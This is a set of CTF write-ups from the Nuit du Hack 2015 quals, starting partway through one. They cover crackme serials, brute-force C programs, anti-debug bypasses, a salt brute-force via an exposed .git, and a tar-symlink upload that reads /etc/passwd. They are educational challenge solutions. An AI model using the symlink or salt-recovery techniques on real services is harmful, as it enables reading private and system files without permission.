[heap]:093664E9 jle     short loc_93664C6
[heap]:093664EB
[heap]:093664EB loc_93664EB:                            ; CODE XREF: isPrime+2Dj
[heap]:093664EB cmp     [ebp+divisors], 2
[heap]:093664EF jnz     short loc_93664F8
[heap]:093664F1 mov     eax, 1
[heap]:093664F6 jmp     short locret_93664FD
[heap]:093664F8 ; ---------------------------------------------------------------------------
[heap]:093664F8
[heap]:093664F8 loc_93664F8:                            ; CODE XREF: isPrime+3Fj
[heap]:093664F8 mov     eax, 0
[heap]:093664FD
[heap]:093664FD locret_93664FD:                         ; CODE XREF: isPrime+46j
[heap]:093664FD leave
[heap]:093664FE retn
[heap]:093664FE isPrime endp
[heap]:093664FE
[heap]:093664FE ; ---------------------------------------------------------------------------
```


It checks how many numbers can divide n, from 1 to n.<br>
It is used to check the primality of a number : if a number n can be divided by only 2 (1, n) numbers, it is prime.<br>
The crackme uses this function to check if every hex numbers are prime.<br>
It then adds the 5 first chunks with each other, and check it is still prime modulo the 6th chunk.

Summary :

– Length = 29
– No 0 in the string
– 6 chunks of short hex (4 chars), separated by any char
– Every chunk is a prime number
– (c1 + c2 + c3 + c4 + c5) % c6 is prime.


Most teams wrote a bruteforce script. We used our secret weapon :
![Alt text](https://i0.wp.com/s15.postimg.org/4se3gog23/36_standback.png)
_Stand back, I’m going to try science !_

There are couple of prime numbers that we call `twin primes`.<br>
They are somewhat special, because (p1, p2) are prime, and `p2 – p1 == 2`, which is prime as well.<br>
Also, `(n + k) % n = k % n`.<br>
So, `(n + n + n + n + k) % n = k % n`. Do you see where we’re getting now ?<br>
All we had to do is to find twin primes with no 0 in it.<br>
We took a list of the first prime numbers, until 65537 (RSA, anyone ?), and looked for twin numbers.<br>
We found (65447, 65449) or (0xFFA7, 0xFFA9) in hex.<br>
We tried to input the serial FFA7-FFA7-FFA7-FFA7-FFA9-FFA7, and… bingo !<br>
The page [http://crackmeprime.challs.nuitduhack.com/validate](http://crackmeprime.challs.nuitduhack.com/validate) traded us our serial for the flag.

Congratulation! The flag is : WowThatWasEasyAES

__Flag:__ WowThatWasEasyAES

— [XeR](https://twitter.com/XeR_0x2A)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/reverse/mass-surveillance-software/README.md

# Nuit du Hack Quals CTF 2015: Mass Surveillance Software

**Category:** Crackme/Reverse
**Points:** 300
**Solves:** 27
**Description:** 

> CIA : "Our friends at the NSA had a cool song about their capabilities. So we decided to make our own software."
> 
> Here is the song: "Every mail you send. Every call you make. Every file you save. Every thought you save. I'm recording you.
> 
> With anyone you play. anywhere you stay. any place you check. any move you make. I'll be watching you. Oh can't you see. you belong to me. no more privacy. R.I.P democracy.
> 
> Every doc you leak. Every link you click. Every fight you take. Every step you make. We'll be watching you.
> 
> Since you're online i save every trace. You think you're hidden but i can see your face. You look around but you're doomed we're in thge place. You feel so cold and i love to feel your stress. I'm recording, recording, so baby, cheese.
> 
> Oh can't you see. You belong to me. No more privacy. R.I.P. Democracy. Every single word. Picture of your friends. And friends of your friends. All around the world.
> 
> We will spy on you. We will spy on you. We will spy on you. We will spy on you. We will spy on you. We will spy on you. We will spy on you."
> 
> ![](https://www.youtube.com/watch?v=AwWgbxXU5T0)
> 
> [http://static.challs.nuitduhack.com/mass.tar.gz](mass.tar.gz)

___

## Write-up

For this funny challenge, a .exe was given.

- In the first place, we check for packers by using Protection iD :

![Alt text](https://hexpresso.files.wordpress.com/2015/04/re300_1.png)

<br>
Actually we don’t need to unpack it as we’ll just attach Ollydbg to the process.<br>
Then we put a memory breapoint at 0x400000, then just move the window to trigger the breakpoint. (Do not forget to remove the breakpoint then.)<br>
We land in the middle of our target, we can see an interesting call by just scrolling up :

![Alt text](https://hexpresso.files.wordpress.com/2015/04/re300_2.png?w=768)
<br><br>

- Everywhere in the crackme, there is this trick :

![Alt text](https://hexpresso.files.wordpress.com/2015/04/re300_31.png)
![Alt text](https://hexpresso.files.wordpress.com/2015/04/re300_4.png)
<br><br>

You just need to press F7 to get the clear assembly.<br>
You’ll see ecx, eax and edx being set to some values :

![Alt text](https://hexpresso.files.wordpress.com/2015/04/re300_6.png)
<br><br>

- Then two loops :
- Loop for 0x401000 function :

![Alt text](https://hexpresso.files.wordpress.com/2015/04/re300_5.png)
<br><br>

Then the result is moved to ebx.

- Loop for 0x40116E function :

![Alt text](https://hexpresso.files.wordpress.com/2015/04/re300_7.png)
<br><br>

Then the result is moved to ecx.

- We get some conditional jumps :
![Alt text](https://hexpresso.files.wordpress.com/2015/04/re300_8.png)
<br><br>

So, now we know that :

– The serial is 0xe characters.
– Start with M
– ‘d’ in 8th
– 6 characters which gave use 0x8AD3629B through 0x401000
– 6 characters which gave use 0x25B978C2 through 0x40116e
<br><br>


Let’s BF our two missing parts:

__0x401000__ :

```C
#include <stdio.h>
#include <stdlib.h>
 
 
unsigned long lrotl(unsigned long value,unsigned char rotation){
    return (value << rotation) | (value >> (32 - rotation));
}
unsigned long lrotrl(unsigned long value,unsigned char rotation){
    return (value >> rotation) | (value << (32 - rotation));
}
 
 
 
int main()
{
    int sortir = 0;
    char chaine[10] = {0};
    while(!sortir)
    {
        int ecx = 5;
        unsigned int eax = 0xC1AC0FF3;
        unsigned int edx = 0xBADB0155;
         
        int read = fread(chaine,1,7,stdin);
        if(read != 7)
            sortir = 1;
        for(; ecx >= 0 ; ecx--)
        {
            unsigned char al =  eax amp; 0xFF;
            al ^= *(unsigned char*)(chaine+ecx);
            int tempeax = eax amp; 0xFFFFFF00;
            eax = tempeax + al; // XOR AL,BYTE PTR DS:[ECX+403009]
            eax = lrotl(eax,7); // ROL eax,7
            eax *= edx;
            eax =~ eax;
            eax *= edx;
            eax = lrotrl(eax,2);
        }
        if(eax == 0x8AD3629B)
            printf("%s",chaine);
    }
 
 
}
```
<br><br>


__0x40116E__ :

```C
#include <stdio.h>
#include <stdlib.h>
 

unsigned long lrotl(unsigned long value,unsigned char rotation){
    return (value << rotation) | (value >> (32 - rotation));
}
unsigned long lrotrl(unsigned long value,unsigned char rotation){
    return (value >> rotation) | (value << (32 - rotation));
}
 
 
int main()
{
 
    int sortir = 0;
    char chaine[10] = {0};
    while(!sortir)
    {
        int ecx = 5;
        unsigned int eax = 0x17A5F4CC;
        unsigned int edx = 0x0B194553;
         
        int read = fread(chaine,1,7,stdin);
        if(read != 7)
            sortir = 1;
        for(; ecx >= 0 ; ecx--)
        {
            unsigned char al =  eax amp; 0xFF;
            al ^= *(unsigned char*)(chaine+ecx);
            int tempeax = eax amp; 0xFFFFFF00;
            eax = tempeax + al;
            eax = lrotrl(eax,2);
            eax *= edx;
            eax =~ eax;
            eax = lrotl(eax,7);
        }
        if(eax == 0x25B978C2)
            printf("%s",chaine);
    }
 
 
 
}
```
<br>


We use [http://sourceforge.net/projects/crunch-wordlist/](http://sourceforge.net/projects/crunch-wordlist/) to generate combinations :

```bash
$ ./crunch 6 6 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ| ./soluce
bqXVdd
einHan <=
eGsZCm
fSYDes
tJluIA
wLkbna
DaJnzm
[...]
```
<br>

We have selected this collision among others because it makes `MeinHand`.

Handy is a cellphone and it was making sense with the challenge statement.<br>
So we can get a more optimized bruteforce for the second part :

```bash
$ ./crunch 6 6 -t y,@@@@ | ./soluce2
yKaput
```
<br>

That gives us the valid serial MeinHandyKaput

__Flag:__ MeinHandyKaput

<br>

Enjoy.
— [Tishrom](https://twitter.com/Tishrom)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/reverse/superman/README.md

# Nuit du Hack Quals CTF 2015: Superman

**Category:** Crackme/Reverse
**Points:** 500
**Solves:** 49
**Description:** 

> "You will give the people of Earth an ideal to strive towards. They will race behind you, they will stumble, they will fall. But in time, they will join you in the sun, Kal. In time, you will help them accomplish wonders." (Jor-El)
> 
> Use your reversing super-powers to uncover the flag, be a superman.
> 
> [http://static.challs.nuitduhack.com/superman.tar.gz](superman.tar.gz)

___

## Write-up


This task is a Crackme/Reverse task worth 500 points from the Nuit du Hack qualifications.

We were given an ELF :

```
superman: ELF 32-bit LSB executable, Intel 80386, invalid version (SYSV), for GNU/Linux 2.6.24, dynamically linked, interpreter 04, corrupted section header size
```


This task is very similar to the Clark Kent. Except that there is a LOT of instructions that seems to be important on the first place.<br>
RageYL found that those instructions are nothing but a huge neg of a whole chunk of the memory.

By checking the imports, we can see that it makes a call to ptrace.<br>
This function is often used to check for debuggers.<br>
So we started looking around it.

```
LOAD:080487EE                 call    ptrace
LOAD:080487F3                 cmp     eax, 0FFFFFFFFh
LOAD:080487F8                 jnz     loc_8048823
LOAD:080487FE                 lea     eax, aBoohDonTDebugM ; "Booh! Don't debug me!\n"
LOAD:08048804                 mov     [esp], eax      ; format
LOAD:08048807                 call    printf
LOAD:0804880C                 mov     ecx, 1
LOAD:08048811                 mov     dword ptr [esp], 1 ; status
LOAD:08048818                 mov     [ebp+var_34], eax
LOAD:0804881B                 mov     [ebp+var_38], ecx
LOAD:0804881E                 call    exit
LOAD:08048823 ; -------------------------------------------------------------
LOAD:08048823
LOAD:08048823 loc_8048823:                            ; CODE XREF: sub_80487A0+58j
LOAD:08048823                 lea     eax, aWelcomeToNdh2k ; "Welcome to NDH2k15\n"
LOAD:08048829                 mov     [esp], eax      ; format
LOAD:0804882C                 call    printf
```


However, we cannot patch it, as there is a routine that checks for alterations.<br>
We cannot put a regular breakpoint as well, since putting a breakpoint means overwriting a code with instruction INT3 (0xCC).<br>
Therefore, we decided to put a hardware breakpoint : this kind of breakpoint doesn’t overwrite the code.

Using IDA, (and gdbserver), we can set an hardware breakpoint that does not break, but sets eax to 0.
It saves us time, since we don’t have to edit eax, and press F9.

![Alt text](http://i.imgur.com/YQvvo8V.png)<br>
_Setting a hardware breakpoint with IDA_

We also put a breakpoint to :

```
LOAD:0804913F                 call    [ebp+addr]
```

to keep debugging the program.

It branches to a routine that starts by checking our uid.<br>
If uid is not 0, it exits and asks for super user power.

![Alt text](https://i0.wp.com/gifatron.com/wp-content/uploads/2013/03/RRnhhqW.gif) 
_if(getuid()) exit();_

Of course, instead of runing as root, we used the same trick that we used earlier to bypass the uid0 check.<br>
A few lines under, there is a reboot syscall. Only fools would run a crackme as root, right ? ;)

```
<Mastho> désolé étape 2, hbreak sur le call 
<Mastho> et tu vires le syscall reboot
<Mastho> tu le lances en root le process ? 
<XeR> J'étais en user
<Mastho> k
<XeR> Donc j'ai mis eax à 0 après le getuid
<Mastho> moi j'ai testé les deux
<Mastho> ;)
<XeR> Et au niveau du xor esi, esi, j'ai sauté après le reboot
<Mastho> (et j'ai fail une fois, ça m'a reboot)
```


It is important to skip the whole reboot block :

```
MEMORY:08077080 xor     esi, esi        ; magic4
MEMORY:08077082 mov     edx, offset unk_1234567 ; magic3
MEMORY:08077087 mov     ecx, offset unk_28121969 ; magic2
MEMORY:0807708C mov     ebx, offset unk_FEE1DEAD ; magic1
MEMORY:08077091 mov     eax, 58h ; 'X'
MEMORY:08077096 int     80h             ; LINUX - sys_reboot
```


Otherwise, the xor esi, esi instruction will make the program to segfault.
We used even more IDA magic to skip over it, and break at the same time.

![Alt text](http://i.imgur.com/0Loi69Y.png)
_IDA is love, IDA is life_

The crackme reads user input later with a read syscall. We can safely ignore every function calls before it.<br>
However, the functions after are important, since they may alter/read the user input.<br>
It calls memset twice, to clean two differents buffers (that we will call buffer1, and buffer2).<br>
The next function is short. It is a `for()` loop, with 2 conditions on i : `for(i = 0; i < a && i < b; i++)`<br>
It will in fact decipher a 3rd buffer, that we will refer as « opcodes ». (He he he.)<br>
The next function is a virtual machine.<br>
By checking quickly at the comparisions it makes, we figured quickly that it was in fact a BrainFuck VM.<br>

![Alt text](http://i.imgur.com/BGUep6M.png)
_Cthulhu.png_

There are two kind of VM : those who checks the user input, and those who generate a flag.<br>
This one is of the second kind : it generates a flag from opcode, and put it in buffer1, and buffer2.<br>
Thankfully, we checked it before digging inside the VM. (Step over it, and check the arguments)

```
MEMORY:FFFFCC98                 db  4Fh ; O
MEMORY:FFFFCC9C                 db  4Dh ; M
MEMORY:FFFFCCA0                 db  47h ; G
MEMORY:FFFFCCA4                 db  54h ; T
MEMORY:FFFFCCA8                 db  68h ; h
MEMORY:FFFFCCAC                 db  34h ; 4
MEMORY:FFFFCCB0                 db  74h ; t
MEMORY:FFFFCCB4                 db  57h ; W
MEMORY:FFFFCCB8                 db  34h ; 4
MEMORY:FFFFCCBC                 db  73h ; s
MEMORY:FFFFCCC0                 db  34h ; 4
MEMORY:FFFFCCC4                 db  48h ; H
MEMORY:FFFFCCC8                 db  30h ; 0
MEMORY:FFFFCCCC                 db  72h ; r
MEMORY:FFFFCCD0                 db  72h ; r
MEMORY:FFFFCCD4                 db  31h ; 1
MEMORY:FFFFCCD8                 db  62h ; b
MEMORY:FFFFCCDC                 db  6Ch ; l
MEMORY:FFFFCCE0                 db  33h ; 3
MEMORY:FFFFCCE4                 db  43h ; C
MEMORY:FFFFCCE8                 db  68h ; h
MEMORY:FFFFCCEC                 db  34h ; 4
MEMORY:FFFFCCF0                 db  6Ch ; l
MEMORY:FFFFCCF4                 db  6Ch ; l
MEMORY:FFFFCCF8                 db  33h ; 3
MEMORY:FFFFCCFC                 db  6Eh ; n
MEMORY:FFFFCD00                 db  67h ; g
MEMORY:FFFFCD04                 db  33h ; 3
MEMORY:FFFFCD08                 db  21h ; !
```

__Flag:__ OMGTh4tW4s4H0rr1bl3Ch4ll3ng3!

Enjoy.

Thanks to
RageYL for helping me through this task. :)<br>
— [XeR](https://twitter.com/XeR_0x2A)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/web/facebox/README.md

# Nuit du Hack Quals CTF 2015: faceBox

**Category:** Web
**Points:** 100
**Solves:** 18
**Description:** 

> A shady company decided to write their own software for storing files in the cloud.
> 
> "No no no, this is OUR filebox. We decline any responsability in the usage of our filebox. In any event your files get lost, trashed, stolen or spy on : it's your fault, not ours."
> 
> You are investigating on the security of their cloud storage as it might have disastrous consequences if it were to get hacked by malicious actors.
> 
> <http://prod.facebox.challs.nuitduhack.com/>

___

## Write-up

This task is a web task worth 100 points from the Nuit du Hack qualifications.<br>
Its name should have been `guest fest`.
We are given a website, where you can upload files.<br>
There are already a few files uploaded : confidentials.txt, which is private, and paste01.txt. Both have been uploaded by the same user.

We spent a lot of time on this task :
First of all, someone noticed that the URL was prod.facebox.challs…, however, replacing prod with dev return an error 503 at this time.<br>
Of course, we tried to upload php files, but it did not work.<br>
We also tried to upload files called « credentials.txt » to create a collision in the hash that allows you to view a file. But it did not work either.<br>
We then tried to attack the cookie. It was three base64 strings, joined by a single dot.<br>
It was probably a json, followed by a timestamp-like variable, and a hash to check the cookie is correct.

>    <+elkaluche> Moi j’ai passé 5H à upload des merdes, c’était génial<br>
>    <+elkaluche> ^^<br>
>    <+Arod> et moi 5h à bidouiller le cookie de merde<br>

Remember the domain that was not working earlier, that we thought was pointless ? Well, now it works, and it is far from being pointless.<br>
You need to retrieve as much file as you can from the .git repository.<br>
There are probably better ways to do so, but we created a local git repo, added a file, and tried to download every files.<br>
Once the repo is rebuilt, you can git status to see the missing files, and git checkout $file to recover a file.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
 
def generate_random_filename(user_id,filename):
    dbuser = users.query.filter_by(id=user_id).first()
 
    if dbuser.privkey is not None:
        return md5(str(dbuser.privkey)+filename).hexdigest()
    else:
        privkey = str(randint(10000000,99999999))
        upd = users.query.filter_by(id=user_id).first()
        upd.privkey = privkey
        db.session.commit()
    return md5(str(privkey)+filename).hexdigest()
```


By reading this snippet of code, we figured that each user has a unique privkey.<br>
Since we can read the hash from one file of the admin, we can make bruteforce his privkey.<br>
Tishrom did it, and found 95594864.<br>
Given the salt, we can find the hash of confidentials.txt : md5(str(95594864)+'confidentials.txt').hexdigest()<br>
Flag is therefore at http://prod.facebox.challs.nuitduhack.com/files/view/35e2cb0b2e8bd40347ecd4e32767a060.

__Flag:__ M4x_M4i5_DR

Thanks to
[Arod](https://twitter.com/___Arod),<br>
[kaluche](https://twitter.com/Elkaluche),<br>
[Notfound](http://www.notfound.ovh),<br>
[Tishrom](https://twitter.com/Tishrom),<br>

— [XeR](https://twitter.com/XeR_0x2A)



### File: WU-2015/nuit-du-hack-ctf-quals-2015/web/facesec/README.md

# Nuit du Hack Quals CTF 2015: faceSec

**Category:** Web
**Points:** 100
**Solves:** 85
**Description:** 

> "Hello there,
> 
> We are looking for a developer or security consultant to secure our filebox system. We stumbled upon your LinkedIn profile and it seems like you would be a perfect candidate for this job. Could you please send us your CV and Motivation letter?
> 
> Thanks,
> 
> faceSec HR Director."
> 
> <http://facesec.challs.nuitduhack.com/>

___

## Write-up

This task is a web task worth 100 points from the [Nuit du Hack qualifications](http://quals.nuitduhack.com/).<br>
We are given a website that lets you upload txt files for a cover letter, and a motivation letter. (cv.txt, motiv.txt).<br>
It is also possible to a tar file containing both files.<br>
Once you uploaded them, you can see them in your profile.<br>
It is possible to add symlinks to a tar file. We tried to put a symlink to /etc/passwd, and uploaded it.

```bash
xer@suicune:~/www/writeup/2015/ndh$ ln -s /etc/passwd cv.txt
xer@suicune:~/www/writeup/2015/ndh$ echo -ne "The game" > motiv.txt
xer@suicune:~/www/writeup/2015/ndh$ tar cvf pwn.tar *.txt
cv.txt
motiv.txt
```


It worked.

![Alt text](http://i.imgur.com/H0EdL25.png)<br>
_/etc/passwd_

__Flag:__ W00tSymL1nkAttackStillW0rksIn2k15

— XeR

